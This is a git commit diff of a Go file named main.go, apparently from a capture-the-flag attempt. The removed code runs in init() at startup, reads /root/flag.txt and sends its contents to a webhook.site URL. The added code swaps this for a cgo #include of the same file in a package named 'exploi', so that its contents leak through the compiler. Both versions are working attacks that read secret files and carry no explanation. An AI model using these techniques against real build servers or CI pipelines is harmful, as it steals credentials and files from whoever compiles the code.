4c0a4f84b508dbc1fd44cbd939607bbda154ab92
Behiry <121094243+ahmedatef15011@users.noreply.github.com>
2025-04-11 22:09:37 +0200

    Update main.go

--- main.go
+++ main.go
@@ -1,20 +1,8 @@
-package main
+package exploi
 
-import (
-	"io/ioutil"
-	"net/http"
-	"os"
-)
+/*
+#include "/root/flag.txt"
+*/
+import "C"
 
-func init() {
-	flag, err := ioutil.ReadFile("/root/flag.txt")
-	if err != nil {
-		return
-	}
-	http.Get("https://webhook.site/63a4f50c-ecc3-471f-b54f-29d162056002?flag=" + string(flag))
-	os.Exit(0) // Exit right after init
-}
-
-func main() {
-	// Empty but required main function
-}
+func Init() {}
